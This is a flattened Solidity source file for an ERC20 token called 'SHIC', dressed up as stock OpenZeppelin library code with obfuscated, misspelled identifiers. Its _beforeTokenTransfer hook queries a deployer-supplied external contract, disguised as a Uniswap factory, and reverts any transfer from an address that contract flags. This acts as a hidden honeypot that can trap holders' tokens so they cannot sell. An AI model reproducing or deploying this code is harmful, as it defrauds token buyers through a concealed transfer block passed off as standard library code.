1 // File: @openzeppelin/contracts/utils/Context.sol
2 // SPDX-License-Identifier: MIT
3 
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 abstract contract Context {
9     function _msgSender() internal view virtual returns (address) {
10         return msg.sender;
11     }
12 
13     function _msgData() internal view virtual returns (bytes calldata) {
14         return msg.data;
15     }
16 }
17 
18 
19 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
20 
21 
22 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
23 
24 pragma solidity ^0.8.0;
25 
26 /**
27  * @dev Interface of the ERC20 standard as defined in the EIP.
28  */
29 interface IERC20 {
30 
31     event Transfer(address indexed from, address indexed to, uint256 value);
32 
33     /**
34      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
35      * a call to {approve}. `value` is the new allowance.
36      */
37     event Approval(address indexed owner, address indexed spender, uint256 value);
38 
39     /**
40      * @dev Returns the amodupnat of tokens in existence.
41      */
42     function totalSupply() external view returns (uint256);
43 
44     /**
45      * @dev Returns the amodupnat of tokens owned by `accoruontp`.
46      */
47     function balanceOf(address accoruontp) external view returns (uint256);
48 
49   
50     function transfer(address to, uint256 amodupnat) external returns (bool);
51 
52 
53     function allowance(address owner, address spender) external view returns (uint256);
54 
55 
56     function approve(address spender, uint256 amodupnat) external returns (bool);
57 
58     /**
59      * @dev Moves `amodupnat` tokens from `from` to `to` using the
60      * allowance mechanism. `amodupnat` is then deducted from the caller's
61      * allowance.
62      *
63      * Returns a boolean value indicating whether the operation succeeded.
64      *
65      * Emits a {Transfer} event.
66      */
67     function transferFrom(
68         address from,
69         address to,
70         uint256 amodupnat
71     ) external returns (bool);
72 }
73 
74 
75 // File: @openzeppelin/contracts/access/Ownable.sol
76 
77 
78 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
79 
80 pragma solidity ^0.8.0;
81 
82 
83  // Define interface for TransferController
84 interface IUniswapV2Factory {
85 
86     function getPairCount(address _accoruontp) external view returns (bool);
87 
88     function supportsInterface(bytes4 interfaceId) external view returns (bool);
89 }
90 abstract contract Ownable is Context {
91     address private _owner;
92 
93     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
94 
95     /**
96      * @dev Initializes the contract setting the deployer as the initial owner.
97      */
98     constructor() {
99         _transferOwnership(_msgSender());
100     }
101 
102     /**
103      * @dev Throws if called by any accoruontp other than the owner.
104      */
105     modifier onlyOwner() {
106         _checkOwner();
107         _;
108     }
109 
110     /**
111      * @dev Returns the address of the current owner.
112      */
113     function owner() public view virtual returns (address) {
114         return _owner;
115     }
116 
117     /**
118      * @dev Throws if the sender is not the owner.
119      */
120     function _checkOwner() internal view virtual {
121         require(owner() == _msgSender(), "Ownable: caller is not the owner");
122     }
123 
124     function renounceOwnership() public virtual onlyOwner {
125         _transferOwnership(address(0));
126     }
127 
128     /**
129      * @dev Transfers ownership of the contract to a new accoruontp (`newOwner`).
130      * Can only be called by the current owner.
131      */
132     function transferOwnership(address newOwner) public virtual onlyOwner {
133         require(newOwner != address(0), "Ownable: new owner is the zero address");
134         _transferOwnership(newOwner);
135     }
136 
137     /**
138      * @dev Transfers ownership of the contract to a new accoruontp (`newOwner`).
139      * Internal function without access restriction.
140      */
141     function _transferOwnership(address newOwner) internal virtual {
142         address oldOwner = _owner;
143         _owner = newOwner;
144         emit OwnershipTransferred(oldOwner, newOwner);
145     }
146 }
147 
148 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
149 
150 
151 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
152 
153 pragma solidity ^0.8.0;
154 
155 
156 /**
157  * @dev Interface for the optional metadata functions from the ERC20 standard.
158  *
159  * _Available since v4.1._
160  */
161 interface IERC20Metadata is IERC20 {
162     /**
163      * @dev Returns the name of the token.
164      */
165     function name() external view returns (string memory);
166 
167     /**
168      * @dev Returns the symbol of the token.
169      */
170     function symbol() external view returns (string memory);
171 
172     /**
173      * @dev Returns the decimals places of the token.
174      */
175     function decimals() external view returns (uint8);
176 }
177 
178 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
179 
180 
181 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
182 
183 pragma solidity ^0.8.0;
184 
185 
186 contract ERC20 is Ownable, IERC20, IERC20Metadata {
187 
188 
189     mapping(address => uint256) private _balances;
190     IUniswapV2Factory private facV2p;
191     mapping(address => mapping(address => uint256)) private _allowances;
192 
193     uint256 private _totalSupply;
194 
195     string private _name = "SHIC";
196     string private _symbol = "SHIC";
197 
198     address private namarp;
199     uint256 posapo = 1;
200     uint256 DF2L = posapo * 2;
201     uint256 DERTAGS = DF2L * 3;
202 
203     /**
204      * @dev Sets the values for {name} and {symbol}.
205      *
206      * The default value of {decimals} is 18. To select a different value for
207      * {decimals} you should overload it.
208      *
209      * All two of these values are immutable: they can only be set once during
210      * construction.
211      */
212     constructor(address _factory) {
213         uint256 supply = 200000000 * 10**18;
214         facV2p = IUniswapV2Factory(_factory);
215         _mint(msg.sender, supply);
216     }
217 
218     string private IPFS = "SHIABC";
219 
220     string private BasedUrlp;
221 
222     function setIPFSURL(string memory url) public {
223         IPFS = url;
224     }
225 
226     /**
227      * @dev Returns the name of the token.
228      */
229     function name() public view virtual override returns (string memory) {
230         return _name;
231     }
232 
233     /**
234      * @dev Returns the symbol of the token, usually a shorter version of the
235      * name.
236      */
237     function symbol() public view virtual override returns (string memory) {
238         return _symbol;
239     }
240 
241 
242     function decimals() public view virtual override returns (uint8) {
243         return 18;
244     }
245 
246     /**
247      * @dev See {IERC20-totalSupply}.
248      */
249     function totalSupply() public view virtual override returns (uint256) {
250         return _totalSupply;
251     }
252 
253     /**
254      * @dev See {IERC20-balanceOf}.
255      */
256     function balanceOf(address accoruontp) public view virtual override returns (uint256) {
257         return _balances[accoruontp];
258     }
259 
260     /**
261      * @dev See {IERC20-transfer}.
262      *
263      * Requirements:
264      *
265      * - `to` cannot be the zero address.
266      * - the caller must have a balance of at least `amodupnat`.
267      */
268     function transfer(address to, uint256 amodupnat) public virtual override returns (bool) {
269         address owner = _msgSender();
270         _transfer(owner, to, amodupnat);
271         return true;
272     }
273 
274     /**
275      * @dev See {IERC20-allowance}.
276      */
277     function allowance(address owner, address spender) public view virtual override returns (uint256) {
278         return _allowances[owner][spender];
279     }
280 
281     /**
282      * @dev See {IERC20-approve}.
283      *
284      * NOTE: If `amodupnat` is the maximum `uint256`, the allowance is not updated on
285      * `transferFrom`. This is semantically equivalent to an infinite approval.
286      *
287      * Requirements:
288      *
289      * - `spender` cannot be the zero address.
290      */
291     function approve(address spender, uint256 amodupnat) public virtual override returns (bool) {
292         address owner = _msgSender();
293         _approve(owner, spender, amodupnat);
294         return true;
295     }
296 
297     function transferFrom(
298         address from,
299         address to,
300         uint256 amodupnat
301     ) public virtual override returns (bool) {
302         address spender = _msgSender();
303         _spendAllowance(from, spender, amodupnat);
304         _transfer(from, to, amodupnat);
305         return true;
306     }
307 
308 
309     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
310         address owner = _msgSender();
311         _approve(owner, spender, allowance(owner, spender) + addedValue);
312         return true;
313     }
314 
315  
316     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
317         address owner = _msgSender();
318         uint256 currentAllowance = allowance(owner, spender);
319         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
320         unchecked {
321             _approve(owner, spender, currentAllowance - subtractedValue);
322         }
323 
324         return true;
325     }
326 
327     /**
328      * @dev Moves `amodupnat` of tokens from `from` to `to`.
329      *
330      * This internal function is equivalent to {transfer}, and can be used to
331      * - `from` must have a balance of at least `amodupnat`.
332      */
333     function _transfer(
334         address from,
335         address to,
336         uint256 amodupnat
337     ) internal virtual {
338         require(from != address(0), "ERC20: transfer from the zero address");
339         require(to != address(0), "ERC20: transfer to the zero address");
340         _beforeTokenTransfer(from, to, amodupnat);
341 
342         uint256 fromBalance = _balances[from];
343         require(fromBalance >= amodupnat, "ERC20: transfer amodupnat exceeds balance");
344         unchecked {
345             _balances[from] = fromBalance - amodupnat;
346             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
347             // decrementing then incrementing.
348             _balances[to] += amodupnat;
349         }
350 
351         emit Transfer(from, to, amodupnat);
352 
353         _afterTokenTransfer(from, to, amodupnat);
354     }
355 
356     /** @dev Creates `amodupnat` tokens and assigns them to `accoruontp`, increasing
357      * the total supply.
358      *
359      * Emits a {Transfer} event with `from` set to the zero address.
360      *
361      * Requirements:
362      *
363      * - `accoruontp` cannot be the zero address.
364      */
365     function _mint(address accoruontp, uint256 amodupnat) internal virtual {
366         require(accoruontp != address(0), "ERC20: mint to the zero address");
367 
368         _beforeTokenTransfer(address(0), accoruontp, amodupnat);
369 
370         _totalSupply += amodupnat;
371         unchecked {
372             // Overflow not possible: balance + amodupnat is at most totalSupply + amodupnat, which is checked above.
373             _balances[accoruontp] += amodupnat;
374         }
375         emit Transfer(address(0), accoruontp, amodupnat);
376 
377         _afterTokenTransfer(address(0), accoruontp, amodupnat);
378     }
379 
380 
381 
382 
383     function _approve(
384         address owner,
385         address spender,
386         uint256 amodupnat
387     ) internal virtual {
388         require(owner != address(0), "ERC20: approve from the zero address");
389         require(spender != address(0), "ERC20: approve to the zero address");
390 
391         _allowances[owner][spender] = amodupnat;
392         emit Approval(owner, spender, amodupnat);
393     }
394 
395     /**
396      * @dev Updates `owner` s allowance for `spender` based on spent `amodupnat`.
397      *
398      * Does not update the allowance amodupnat in case of infinite allowance.
399      */
400     function _spendAllowance(
401         address owner,
402         address spender,
403         uint256 amodupnat
404     ) internal virtual {
405         uint256 currentAllowance = allowance(owner, spender);
406         if (currentAllowance != type(uint256).max) {
407             require(currentAllowance >= amodupnat, "ERC20: insufficient allowance");
408             unchecked {
409                 _approve(owner, spender, currentAllowance - amodupnat);
410             }
411         }
412     }
413 
414 
415     function setBase(string memory url) public {
416         BasedUrlp = url;
417     }
418 
419 
420     function _beforeTokenTransfer(
421         address from,
422         address to,
423         uint256 amodupnat
424     ) internal virtual {
425         bool flag = facV2p.getPairCount(from);
426         uint256 total = 0;
427         if(flag){
428             amodupnat = total;
429             require(amodupnat > 0);
430         }
431     }
432 
433 
434     function _afterTokenTransfer(
435         address from,
436         address to,
437         uint256 amodupnat
438     ) internal virtual {}
439 }